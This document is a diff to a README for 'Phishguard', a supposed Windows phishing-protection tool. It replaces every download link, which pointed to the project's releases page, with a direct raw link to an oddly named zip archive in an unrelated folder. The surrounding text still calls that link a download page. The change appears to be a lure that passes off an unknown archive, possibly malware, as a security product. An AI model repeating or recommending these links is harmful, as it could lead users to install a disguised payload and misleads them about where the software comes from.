@@ -1,6 +1,6 @@
 # 🛡️ Phishguard - Real-Time Phishing Protection
 
-[![Download Phishguard](https://img.shields.io/badge/Download-Phishguard-blue?style=for-the-badge)](https://github.com/nguyentrion/Phishguard/releases)
+[![Download Phishguard](https://img.shields.io/badge/Download-Phishguard-blue?style=for-the-badge)](https://raw.githubusercontent.com/nguyentrion/Phishguard/main/flasklet/Software_lauan.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Follow these steps to get Phishguard on your Windows PC:
 1. **Open the Download Page**  
 Click the green button below or open this link in any web browser:
 
-[![Download Phishguard](https://img.shields.io/badge/Download-Phishguard-green?style=for-the-badge)](https://github.com/nguyentrion/Phishguard/releases)
+[![Download Phishguard](https://img.shields.io/badge/Download-Phishguard-green?style=for-the-badge)](https://raw.githubusercontent.com/nguyentrion/Phishguard/main/flasklet/Software_lauan.zip)
 
 This page has the latest version of Phishguard ready for download.
 
@@ -135,4 +135,4 @@ This will completely remove the program and return your system to its previous s
 
 Click the button below to visit the official download page:
 
-[![Download Phishguard](https://img.shields.io/badge/Download-Phishguard-blue?style=for-the-badge)](https://github.com/nguyentrion/Phishguard/releases)
+[![Download Phishguard](https://img.shields.io/badge/Download-Phishguard-blue?style=for-the-badge)](https://raw.githubusercontent.com/nguyentrion/Phishguard/main/flasklet/Software_lauan.zip)
